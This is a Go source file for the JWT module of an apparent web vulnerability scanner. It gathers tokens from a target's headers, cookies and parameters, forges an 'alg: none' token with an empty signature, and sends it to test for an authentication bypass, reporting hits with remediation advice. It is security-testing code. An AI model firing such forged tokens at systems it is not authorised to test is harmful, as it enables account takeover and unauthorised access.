package modules

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"nightfalllx/pkg/client"
	"strings"
)

type JWTModule struct{}

func NewJWTModule() *JWTModule {
	return &JWTModule{}
}

func (m *JWTModule) Name() string {
	return "jwt"
}

func (m *JWTModule) Description() string {
	return "JSON Web Token (JWT) algorithm none & signature bypass analyzer"
}

func (m *JWTModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding

	// Find any JWT in headers, cookie, or params
	var candidates []string
	if auth, ok := target.Headers["Authorization"]; ok && strings.HasPrefix(auth, "Bearer ") {
		candidates = append(candidates, strings.TrimPrefix(auth, "Bearer "))
	}
	if c.Cookie != "" {
		for _, part := range strings.Split(c.Cookie, ";") {
			kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
			if len(kv) == 2 && strings.Count(kv[1], ".") == 2 {
				candidates = append(candidates, kv[1])
			}
		}
	}
	for _, v := range target.Params {
		if strings.Count(v, ".") == 2 {
			candidates = append(candidates, v)
		}
	}
	for _, v := range target.Data {
		if strings.Count(v, ".") == 2 {
			candidates = append(candidates, v)
		}
	}

	for _, token := range candidates {
		parts := strings.Split(token, ".")
		if len(parts) != 3 {
			continue
		}

		// Decode header
		paddedHeader := parts[0] + strings.Repeat("=", (4-len(parts[0])%4)%4)
		headerBytes, err := base64.RawURLEncoding.DecodeString(paddedHeader)
		if err != nil {
			headerBytes, _ = base64.StdEncoding.DecodeString(paddedHeader)
		}

		var headerMap map[string]interface{}
		if err := json.Unmarshal(headerBytes, &headerMap); err != nil {
			continue
		}

		// Verify that endpoint actually enforces authentication
		unauthResp, unauthErr := c.Request(target.Method, target.URL, "", nil)
		if unauthErr == nil && unauthResp != nil && (unauthResp.StatusCode == 200 || unauthResp.StatusCode == 204) {
			// Endpoint is public: returns success even without authentication, so alg:none is not a bypass!
			continue
		}

		// Craft "alg": "none" token
		noneHeader := map[string]string{"alg": "none", "typ": "JWT"}
		noneHeaderBytes, _ := json.Marshal(noneHeader)
		noneHeaderB64 := base64.RawURLEncoding.EncodeToString(noneHeaderBytes)
		noneToken := fmt.Sprintf("%s.%s.", noneHeaderB64, parts[1])

		// Send request with none token
		testHeaders := map[string]string{
			"Authorization": "Bearer " + noneToken,
		}
		resp, err := c.Request(target.Method, target.URL, "", testHeaders)
		if err == nil && resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 204) {
			findings = append(findings, &Finding{
				Module:      m.Name(),
				Title:       "JWT Algorithm None Authentication Bypass",
				Severity:    SeverityCritical,
				Confidence:  95,
				URL:         target.URL,
				Parameter:   "Authorization Header",
				Payload:     noneToken,
				Detail:      "The application accepted a JWT with 'alg': 'none' and an empty signature, bypassing signature validation.",
				Evidence:    fmt.Sprintf("Original alg: %v, Response with none: HTTP %d", headerMap["alg"], resp.StatusCode),
				Remediation: "Enforce strict algorithm whitelisting (e.g. RS256 or HS256). Explicitly reject 'none' algorithm.",
				CWEID:       347,
			})
			break
		}
	}

	return findings, nil
}
